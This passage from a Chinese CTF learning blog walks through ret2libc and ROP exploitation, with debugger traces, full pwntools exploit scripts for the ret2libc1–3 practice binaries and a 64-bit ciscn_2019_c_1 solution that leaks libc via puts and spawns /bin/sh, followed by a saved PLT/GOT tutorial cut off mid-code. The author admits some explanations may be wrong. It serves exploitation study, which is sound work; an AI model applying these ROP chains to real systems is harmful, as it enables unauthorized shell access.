0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;  ✔ jne    do_system+88             &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;  ✔ jne    do_system+88             &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88             &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88             &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88             &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88             &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88             &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88             &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88             &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;  ✔ jne    do_system+88            &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;  ✔ jne    do_system+88            &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   ...</span><br><span class="line">   ...</span><br><span class="line">   ...</span><br><span class="line">   后面基本都是循环，感觉全列出来意义不大</span><br></pre></td></tr></table></figure><p>ok，接下来找关键汇编代码就行，&lt;system+4&gt;中我们可以看到这句：__arg[1]: 0x8048720 ◂— das     /* ‘/bin/sh’ */__，这里将esp往上的四个地址中的数据当成参数传给system函数，这里我们也可以猜测system会根据第二个参数__arg[1]__执行相关的操作（个人理解，不对的话请恳大佬指正，wx：xy1724252720）【ok，在调了之后的过程后发现猜测有误】</p><p>何为关键汇编，我这里找的是能使ebp发生改变或使esp往高地址指的关键pop等操作</p><p>1、执行了一次函数头，其实好办了，我们接着去找函数尾的标志（leave、retn）</p><p><img src="image-20220420112048550.png" alt="image-20220420112048550"></p><p>2、执行到程序结束也没看到连在一起的leave和retn指令</p><p><img src="image-20220420155856813.png" alt="image-20220420155856813"></p><p>3、同时我们看看我们的ebp和esp，</p><p><img src="image-20220420160233130.png" alt="image-20220420160233130"></p><p>上图中的esp指在0xff8b67b4栈地址处，而我的理想是它指在下图中的0xff8b6b20栈地址处，明显0xff8b67b4&lt;0xff8b6b20，所以说上图中的esp在下图中esp的下方，又因为我们整个过程只由我们主观调用了system函数，所以我们还在system函数中进程就结束了，而结束的原因就是我们已经拿到系统的shell了</p><p><img src="image-20220420160307311.png" alt="image-20220420160307311"></p><p>4、以上说明了我们获得shell的地方是在执行system函数的过程中，所以在以上的探索中我们只看到了system函数的函数头部分而一直没找到system的函数尾部分</p><p><img src="image-20220420160744322.png" alt="image-20220420160744322"></p><p>5、综上，对于这句 payload = flat([‘a’ * 112, system_plt, ‘b’ * 4, binsh_addr]) ，我有了我的一个暂时说得通的理解（应该是错的，但能勉强说通），通过栈溢出，我们可以令程序跳转至system函数，然后在执行system函数头后，会将esp往上四个栈地址（包括esp指向的栈地址）上的数据传入system函数，如下，然后system会调用arg[1]存储的数据进行相应的操作，所以在覆盖时我们需要隔4个字符存储/bin/sh的地址，然而为什么要用arg[1]而不用arg[0]，我暂时还没想好是什么原因，（再提一嘴，arg[0]是执行到这条汇编时的esp指向的栈地址上存储的数据）</p><p><img src="image-20220420161426628.png" alt="image-20220420161426628"></p><br/><p><strong>小结：</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;之前我从未想到过系统的shell是在执行system函数时拿到的，所以很多地方都想不通，现在也算是想通一部分了吧，ok，ret2libc1的exp探索结束了，之后还有ret2libc2和ret2libc3的，其实我感觉最难搞懂的点也就这里的 payload = flat([‘a’ * 112, system_plt, ‘b’ * 4, binsh_addr]) 中为什么间隔的那四个无用字符。</p><br/><br/><h2 id="一些小细节-不明白的地方"><a href="#一些小细节-不明白的地方" class="headerlink" title="一些小细节(不明白的地方)"></a>一些小细节(不明白的地方)</h2><p>细节1：</p><p><img src="image-20220420112332154.png" alt="image-20220420112332154"></p><p><img src="image-20220420112521081.png" alt="image-20220420112521081"></p><p>do为循环标志</p><br/><br/><h1 id="exp中payload分析2"><a href="#exp中payload分析2" class="headerlink" title="exp中payload分析2"></a>exp中payload分析2</h1><p>源自： <a href="https://blog.csdn.net/qq_40827990/article/details/86662079?ops_request_misc=%7B%22request_id%22:%22164828478816780271961568%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=164828478816780271961568&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-86662079.142%5Ev5%5Epc_search_result_cache,143%5Ev6%5Eregister&utm_term=ret2libc2&spm=1018.2226.3001.4187">Ret2libc_钞sir的博客-CSDN博客_ret2libc </a> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">#ret2libc1</span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./ret2libc1&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">system_addr = 0x08048460</span><br><span class="line">binsh_addr = 0x8049720</span><br><span class="line">p.recvuntil(&#x27;RET2LIBC &gt;_&lt;\n&#x27;)</span><br><span class="line">p.sendline(&#x27;a&#x27;*112 + p32(system_addr) + &#x27;aaaa&#x27; + p32(binsh_addr))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#ret2libc2</span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./ret2libc2&#x27;)</span><br><span class="line">buf2_addr = 0x804a080</span><br><span class="line">gets_addr = 0x8048460</span><br><span class="line">system_addr = 0x8048490</span><br><span class="line">pop_ebx_addr = 0x0804843d</span><br><span class="line">p.recvuntil(&#x27;What do you think ?&#x27;)</span><br><span class="line">p.sendline(&#x27;a&#x27;*112 + p32(gets_addr) + p32(pop_ebx_addr) + p32(buf2_addr) + p32(system_addr) + &#x27;aaaa&#x27; + p32(buf2_addr))</span><br><span class="line">p.sendline(&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#ret2libc3</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">p = process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">start_addr = 0x80484d0</span><br><span class="line">puts_plt_addr = 0x8048460</span><br><span class="line">libc_start_main_got_addr = 0x804a024</span><br><span class="line">p.recvuntil(&#x27;Can you find it !?&#x27;)</span><br><span class="line">p.sendline(&#x27;q&#x27;*112 + p32(puts_plt_addr) + p32(start_addr) + p32(libc_start_main_got_addr))</span><br><span class="line">libc_start_main_addr = u32(p.recv(4))</span><br><span class="line">print &quot;__libc_start_main_addr: &quot; + hex(libc_start_main_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)</span><br><span class="line">system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;) + 0xb9</span><br><span class="line">print &quot;system_addr: &quot; + hex(system_addr)</span><br><span class="line">print &quot;binsh_addr: &quot; + hex(binsh_addr)</span><br><span class="line">p.recvuntil(&#x27;Can you find it !?&#x27;)</span><br><span class="line">p.sendline(&#x27;s&#x27;*112 + p32(system_addr) + &#x27;aaaa&#x27; + p32(binsh_addr))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1：&#x27;a&#x27;*112 + p32(system_addr) + &#x27;aaaa&#x27; + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">2：&#x27;a&#x27;*112 + p32(gets_addr) + p32(pop_ebx_addr) + p32(buf2_addr) + p32(system_addr) + &#x27;aaaa&#x27; + p32(buf2_addr)</span><br><span class="line"></span><br><span class="line">3：&#x27;q&#x27;*112 + p32(puts_plt_addr) + p32(start_addr) + p32(libc_start_main_got_addr)</span><br><span class="line">   &#x27;s&#x27;*112 + p32(system_addr) + &#x27;aaaa&#x27; + p32(binsh_addr)</span><br></pre></td></tr></table></figure><p>现在我们来看看ret2libc2中的payload：’a’*112 + p32(gets_addr) + p32(pop_ebx_addr) + p32(buf2_addr) + p32(system_addr) + ‘aaaa’ + p32(buf2_addr)</p><br/><p>首先，gets_addr代表gets函数的plt表地址，pop_ebx_addr代表pop eip 、retn这两条指令的地址，buf2_addr代表bss段上的buf2数组的初始地址，system_addr代表system函数的plt表地址，buf2_addr，依照我们的exp执行，此时的buf2上已经存储好了/bin/sh字段，system函数调用后就直接拿到shell。</p><p><img src="image-20220420235733396.png" alt="image-20220420235733396"></p><p><img src="image-20220421000324213.png" alt="image-20220421000324213"></p><p>接下来看过程：</p><p>1、此时栈上的数据排布已被payload覆盖成下图的模样</p><p><img src="image-20220420235632600.png" alt="image-20220420235632600"></p><p>2、</p><p><img src="image-20220420235915866.png" alt="image-20220420235915866"></p><p>3、pop  ebp，ebp指向不存在的栈地址0x61616161</p><p><img src="image-20220421000252529.png" alt="image-20220421000252529"></p><p>4、pop先取数据再增esp，下一条是jmp  eip，不列了，没意义</p><p><img src="image-20220421000643586.png" alt="image-20220421000643586"></p><p>5、此时我们进入先gets函数的plt，在之前的实操环节中，有一个结论：调用plt、got表前后，esp、ebp值不变，所以我们就当没有查plt、got表这一步，直接进入gets函数中执行，因为gets函数它也是函数，进入后第一件事那肯定是执行函数头嘛，所以有了下图</p><p><img src="image-20220421001119679.png" alt="image-20220421001119679"></p><p>6、</p><p><img src="image-20220421001228059.png" alt="image-20220421001228059"></p><p>7、and  esp，0FFFFFFF0h，这步对齐操作直接略过吧，对结果毫无影响</p><p>8、接下来执行gets函数的函数中间部分，这里面会有三步关键操作：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;1）：esp及esp往上的栈上数据作为参数传递给gets函数（注：经过之前的调试，得知这一步是在执行函数头前执行的，也就是第5步之前，所以gets函数中间部分理应只有以下两个操作）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;2）：从外界读入一串字符（外界可以理解为缓冲区吧）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;3）：以buf2_addr这一地址参数作为gets函数的字符容器，也就是把gets到的字符串存入bss段上的buf2（为什么选择buf2_addr这一参数？我又不是开发汇编的，我哪知道，这里就举个例子吧，就像上一个payload分析中system函数与/bin/sh要相隔一个”bbbb”一样，这里的gets函数和buf2_addr也相隔了一个单位的栈空间，暂时就这样理解吧，做pwn题知道这些就够了）</p><p>注：对于2）和3）先后执行哪个我现在还不清楚</p><p>下图中可以看到我们还给程序发送了一串字符，这串字符就是被上述gets读进buf2中的字符，/bin/sh与一个结尾标志符</p><p><img src="image-20220421001658830.png" alt="image-20220421001658830"></p><p>9、</p><p><img src="image-20220421003330425.png" alt="image-20220421003330425"></p><p>10、下一条是jmp  eip，不列了，没意义</p><p><img src="image-20220421003434374.png" alt="image-20220421003434374"></p><p>11、pop_ebx_addr的地址是0x0804843d，可以看到当PC指针跳转至这里开始执行时，会执行一个pop  ebx和一个retn，接下来跟着执行就行</p><p><img src="image-20220421003627350.png" alt="image-20220421003627350"></p><p>12、pop  ebx</p><p><img src="image-20220421003922794.png" alt="image-20220421003922794"></p><p>13、retn拆成pop  eip与jmp  eip，jmp  eip意义不大，不列出</p><p><img src="image-20220421004039324.png" alt="image-20220421004039324"></p><p>14、接下来调用system函数，并且以地址buf2_addr处的数据，即buf2上的/bin/sh作为参数进行相应操作，即get shell（获取最高权限）</p><p>15、分析完毕。</p><br/><br/><h1 id="exp中payload分析3"><a href="#exp中payload分析3" class="headerlink" title="exp中payload分析3"></a>exp中payload分析3</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#ret2libc3</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">p = process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">start_addr = 0x80484d0</span><br><span class="line">puts_plt_addr = 0x8048460</span><br><span class="line">libc_start_main_got_addr = 0x804a024</span><br><span class="line">p.recvuntil(&#x27;Can you find it !?&#x27;)</span><br><span class="line">p.sendline(&#x27;q&#x27;*112 + p32(puts_plt_addr) + p32(start_addr) + p32(libc_start_main_got_addr))</span><br><span class="line">libc_start_main_addr = u32(p.recv(4))</span><br><span class="line">print &quot;__libc_start_main_addr: &quot; + hex(libc_start_main_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)</span><br><span class="line">system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;) + 0xb9</span><br><span class="line">print &quot;system_addr: &quot; + hex(system_addr)</span><br><span class="line">print &quot;binsh_addr: &quot; + hex(binsh_addr)</span><br><span class="line">p.recvuntil(&#x27;Can you find it !?&#x27;)</span><br><span class="line">p.sendline(&#x27;s&#x27;*112 + p32(system_addr) + &#x27;aaaa&#x27; + p32(binsh_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>对于payload = ‘q’*112 + p32(puts_plt_addr) + p32(start_addr) + p32(libc_start_main_got_addr)<br>   与 payload = ‘s’*112 + p32(system_addr) + ‘aaaa’ + p32(binsh_addr)</p><br/><p>自行动手做做分析吧，昂 ^_^</p><br/><br/><h1 id="exp中payload分析4-64位"><a href="#exp中payload分析4-64位" class="headerlink" title="exp中payload分析4(64位)"></a>exp中payload分析4(64位)</h1><p>之前分析的都是32位的，这里简单分析一个64位的exp</p><p>exp来源：<a href="https://blog.csdn.net/weixin_43833642/article/details/106477678?ops_request_misc=&request_id=&biz_id=102&utm_term=ciscn_2019_c_1&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-4-106477678.nonecase&spm=1018.2226.3001.4187">BUUCTF ciscn_2019_c_1_、moddemod的博客-CSDN博客</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">def encrypt(text:list):</span><br><span class="line">    new_list = []</span><br><span class="line">    for i in text:</span><br><span class="line">        if i &lt;= 96 or i &gt; 122:</span><br><span class="line">            if i &lt;= 64 or i &gt; 90:</span><br><span class="line">                if i &gt; 47 and i &lt;= 57:</span><br><span class="line">                    i ^= 0xF</span><br><span class="line">            else:</span><br><span class="line">                i ^= 0xE</span><br><span class="line">        else:</span><br><span class="line">            i ^= 0xD</span><br><span class="line">        new_list.append(chr(i))</span><br><span class="line">    return &#x27;&#x27;.join(new_list)</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">proc_name = [&#x27;/home/moddemod/binary/ciscn_2019_c_1&#x27;]</span><br><span class="line">elf = ELF(proc_name[0])</span><br><span class="line">p = process(proc_name)</span><br><span class="line"># p = remote(&#x27;node3.buuoj.cn&#x27;, 26038)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x400c83</span><br><span class="line">got_puts = elf.got[&#x27;puts&#x27;]</span><br><span class="line">plt_puts = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]</span><br><span class="line">payload = 0x58 * b&#x27;a&#x27; + p64(pop_rdi_ret) + p64(got_puts) + p64(plt_puts) + p64(main_addr)</span><br><span class="line">p.sendline(encrypt(list(payload)))</span><br><span class="line"># p.recv()</span><br><span class="line">print(p.recvuntil(&#x27;\n&#x27;))</span><br><span class="line">print(p.recvuntil(&#x27;\n&#x27;))</span><br><span class="line">puts_real_addr = u64(p.recvuntil(&#x27;\n&#x27;, drop=True).ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;puts&#x27;, puts_real_addr)</span><br><span class="line">libc_base = puts_real_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">p.sendline(&#x27;1&#x27;)</span><br><span class="line">p.recvuntil(&#x27;encrypted\n&#x27;)</span><br><span class="line">system_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">ret = 0x4006b9</span><br><span class="line">payload = b&#x27;9&#x27; * 0x58 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>可以看到我们构造了两句payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="number">0x58</span> * <span class="string">b&#x27;a&#x27;</span> + p64(pop_rdi_ret) + p64(got_puts) + p64(plt_puts) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;9&#x27;</span> * <span class="number">0x58</span> + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)</span><br></pre></td></tr></table></figure><p>这里再把32位的列举出来做对比</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line">payload = <span class="string">&#x27;q&#x27;</span>*<span class="number">112</span> + p32(puts_plt_addr) + p32(start_addr) + p32(libc_start_main_got_addr)</span><br><span class="line">payload = <span class="string">&#x27;s&#x27;</span>*<span class="number">112</span> + p32(system_addr) + <span class="string">&#x27;aaaa&#x27;</span> + p32(binsh_addr)</span><br></pre></td></tr></table></figure><p>可见，仅是多出了一步与rdi相关的操作（因为64位程序将前6个参数分别存至RDI, RSI, RDX, RCX, R8 和 R9这六个寄存器，只有参数超过6个的情况才会将多余的参数入栈）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#p64(pop_rdi_ret) + p64(got_puts) + p64(plt_puts) + p64(main_addr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#所以这里的先执行了一个pop rdi的gadget</span></span><br><span class="line"><span class="comment">#也就是把puts的got地址放到了rdi里</span></span><br><span class="line"><span class="comment">#下一条是putsplt</span></span><br><span class="line"><span class="comment">#就puts(puts_got)</span></span><br><span class="line"><span class="comment">#这样就把got表里存放的puts地址给泄露出来啦</span></span><br><span class="line"><span class="comment">#紧接着返回main函数</span></span><br><span class="line"><span class="comment">#又可以重新打一遍</span></span><br></pre></td></tr></table></figure><br/><br/><h1 id="栈对齐"><a href="#栈对齐" class="headerlink" title="栈对齐"></a>栈对齐</h1><p>暂无</p>]]></content>
    
    
    <summary type="html">历史遗留，不荐参考</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>博文收藏</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/04/16/%E5%8D%9A%E6%96%87%E6%94%B6%E8%97%8F/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/04/16/%E5%8D%9A%E6%96%87%E6%94%B6%E8%97%8F/</id>
    <published>2022-04-16T14:30:41.000Z</published>
    <updated>2022-09-15T00:54:09.923Z</updated>
    
    <content type="html"><![CDATA[<p>因为担心有些博文会被博主删除，在这里提前copy一份</p><p>文章转自：<a href="https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL">Basic-ROP · 语雀 (yuque.com)</a></p><br/><h2 id="Linux动态链接"><a href="#Linux动态链接" class="headerlink" title="* Linux动态链接"></a>* Linux动态链接</h2><p><a href="https://blog.csdn.net/linyt/article/details/51635768">参考博文</a></p><p>关于动态链接与静态链接，可以打个比方就是：如果我的文章引用了别人的一部分文字，在我发布文章的时候把别人的段落复制到我的文章里面就属于静态连接，而做一个超链接让你们自己去看就属于动态链接了</p><h3 id="PLT-amp-GOT"><a href="#PLT-amp-GOT" class="headerlink" title="PLT&amp;GOT"></a>PLT&amp;GOT</h3><p>linux下的动态链接是通过PLT&amp;GOT来实现的，这里做一个实验，通过这个实验来理解</p><p>使用如下源代码 test.c：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_banner</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to World of PLT and GOT\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    print_banner();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依次使用下列命令进行编译：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -g -o test.o -c test.c -m32</span><br><span class="line">gcc -o test test.o -m32</span><br></pre></td></tr></table></figure><p>这样除了原有的 test.c 还有个 test.o 以及可执行文件 test</p><p>通过 <code>objdump -d test.o</code> 可以查看反汇编</p><p><img src="1574510177475-db49a7d5-6909-421e-a868-6829c9a7b4a4.png" alt="img"></p><p>printf() 和函数是在 glibc 动态库里面的，只有当程序运行起来的时候才能确定地址，所以此时的 printf() 函数先用 fc ff ff ff 也就是有符号数的 -4 代替</p><p>运行时进行重定位是无法修改代码段的，只能将 printf 重定位到数据段，但是已经编译好的程序，调用 printf 的时候怎么才能找到这个地址呐？</p><p>链接器会额外生成一小段代码，通过这段代码来获取 printf() 的地址，像下面这样，进行链接的时候只需要对printf_stub() 进行重定位操作就可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 